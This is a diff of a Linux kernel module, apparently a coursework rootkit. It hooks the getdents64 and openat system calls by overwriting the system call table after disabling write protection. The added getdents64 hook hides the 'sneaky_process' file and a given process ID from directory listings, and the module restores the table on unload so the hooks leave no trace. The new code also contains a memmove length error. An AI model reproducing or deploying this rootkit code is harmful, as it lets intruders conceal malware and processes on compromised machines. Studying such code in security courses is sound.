@@ -43,82 +43,34 @@ int disable_page_rw(void *ptr) {
     return 0;
 }
 
-// asmlinkage int (*original_getdents64)(struct pt_regs *);
-
-// asmlinkage int (*sneaky_sys_getdents64)(struct pt_regs *regs) {
-//     linux_dirent64 __user *dirent = (linux_dirent64 *)regs->si;
-
-//     /* Declare the previous_dir struct for book-keeping */
-//     linux_dirent64 *previous_dir, *current_dir, *dirent_ker = NULL;
-//     unsigned long offset = 0;
-
-//     int ret = original_getdents64(regs);
-//     dirent_ker = kvzalloc(ret, GFP_KERNEL);
-
-//     if ((ret <= 0) || (dirent_ker == NULL))
-//         return ret;
-
-//     long error;
-//     error = copy_from_user(dirent_ker, dirent, ret);
-//     if (error) {
-//         goto done;
-//     }
-
-//     while (offset < ret) {
-//         current_dir = (void *)dirent_ker + offset;
-
-//         if (memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0) {
-//             /* Check for the special case when we need to hide the first entry */
-//             if (current_dir == dirent_ker) {
-//                 /* Decrement ret and shift all the structs up in memory */
-//                 ret -= current_dir->d_reclen;
-//                 memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
-//                 continue;
-//             }
-//             /* Hide the secret entry by incrementing d_reclen of previous_dir by
-//              * that of the entry we want to hide - effectively "swallowing" it
-//              */
-//             printk(KERN_INFO "found file\n");
-//             previous_dir->d_reclen += current_dir->d_reclen;
-//         } else {
-//             /* Set previous_dir to current_dir before looping where current_dir
-//              * gets incremented to the next entry
-//              */
-//             previous_dir = current_dir;
-//         }
-
-//         offset += current_dir->d_reclen;
-//     }
-
-//     error = copy_to_user(dirent, dirent_ker, ret);
-//     if (error)
-//         goto done;
-
-// done:
-//     kvfree(dirent_ker);
-//     return ret;
-// }
-
-asmlinkage int (*original_getdents)(struct pt_regs *);
-asmlinkage int sneaky_sys_getdents(struct pt_regs *regs) {
+asmlinkage int (*original_getdents64)(struct pt_regs *);
+asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs) {
     printk(KERN_INFO "sneaky_sys_getdents\n");
-    linux_dirent64 *dire = NULL;
-    int byte_num = original_getdents(regs);
+    // get the dirent struct from reg
+    linux_dirent64 __user *dirent = (linux_dirent64 *)regs->si;
+    // initialize the dirent struct we will copy into
+    linux_dirent64 *dirent_ker = NULL;
+    // call real getdents64
+    int ret = original_getdents64(regs);
+    void *current_addr = NULL;
     int offset = 0;
-    if (byte_num <= 0) return 0;
-    while (offset < byte_num) {
-        char *addr = (char *)regs->si + offset;
-        dire = (linux_dirent64 *)addr;
-        if (strcmp(dire->d_name + 1, "sneaky_process") == 0 || strcmp(dire->d_name + 1, pid) == 0) {
+    if (ret <= 0) {
+        return ret;
+    }
+    while (offset < ret) {
+        current_addr = (void *)dirent + offset;
+        dirent_ker = (linux_dirent64 *)current_addr;
+        char *current_name = dirent_ker->d_name + 1;
+        if (strcmp(current_name, "sneaky_process") == 0 || strcmp(current_name, pid) == 0) {
             printk(KERN_INFO "found file\n");
-            size_t bytes_remaining = byte_num - (offset + dire->d_reclen);
-            memmove((char *)addr, (char *)addr + dire->d_reclen, bytes_remaining);
-            byte_num -= dire->d_reclen;
+            // size_t byte_left = ret - (offset + dirent_ker->d_reclen);
+            ret -= dirent_ker->d_reclen;
+            memmove((char *)current_addr, (char *)current_addr + dirent_ker->d_reclen, ret);
         } else {
-            offset += dire->d_reclen;
+            offset += dirent_ker->d_reclen;
         }
     }
-    return byte_num;
+    return ret;
 }
 
 // 1. Function pointer will be used to save address of the original 'openat' syscall.
@@ -152,12 +104,13 @@ static int initialize_sneaky_module(void) {
     // function address. Then overwrite its address in the system call
     // table with the function address of our new code.
     original_openat = (void *)sys_call_table[__NR_openat];
+    original_getdents64 = (void *)sys_call_table[__NR_getdents64];
 
     // Turn off write protection mode for sys_call_table
     enable_page_rw((void *)sys_call_table);
 
     sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
-
+    sys_call_table[__NR_getdents64] = (unsigned long)sneaky_sys_getdents64;
     // You need to replace other system calls you need to hack here
 
     // Turn write protection mode back on for sys_call_table
@@ -175,7 +128,7 @@ static void exit_sneaky_module(void) {
     // This is more magic! Restore the original 'open' system call
     // function address. Will look like malicious code was never there!
     sys_call_table[__NR_openat] = (unsigned long)original_openat;
-
+    sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
     // Turn write protection mode back on for sys_call_table
     disable_page_rw((void *)sys_call_table);
 }
